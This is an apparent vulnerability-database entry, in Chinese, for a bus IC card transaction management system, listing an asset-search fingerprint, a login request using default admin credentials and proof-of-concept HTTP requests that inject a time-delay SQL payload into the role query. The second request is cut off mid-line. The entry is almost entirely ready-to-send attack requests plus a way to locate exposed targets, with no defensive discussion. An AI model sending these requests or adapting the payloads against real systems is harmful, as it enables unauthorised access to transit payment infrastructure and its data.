# 公交IC卡收单管理系统多处SQL注入致RCE漏洞

- **系统**：公交IC卡收单管理系统多处SQL注入致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="公交IC卡收单管理系统"`
- **请求**：`POST /login HTTP/1.1`

**请求体 / payload**
```
获取cookie
Host:
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Priority: u=0
X-Requested-With: XMLHttpRequest
username=admin&password=e10adc3949ba59abbe56e057f20f883e
**填入Cookie插入Payload延时5秒 **
**PoC-1**
POST /role HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: JSESSIONID=BE20D06711487C9D6D5325C1129F244C
X-Requested-With: XMLHttpRequest
_search=false&nd=1727245571646&rowCountPerPage=10&pageNo=1&sidx=ROLE_NAME&sord=asc&method=select&ROLE_NAME=1');WAITFOR DELAY '0:0:5'--
**POC-2**
POST /user HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Coo…（脚本共 1988 字，完整版见原文）
```
- **预期**：200　|　—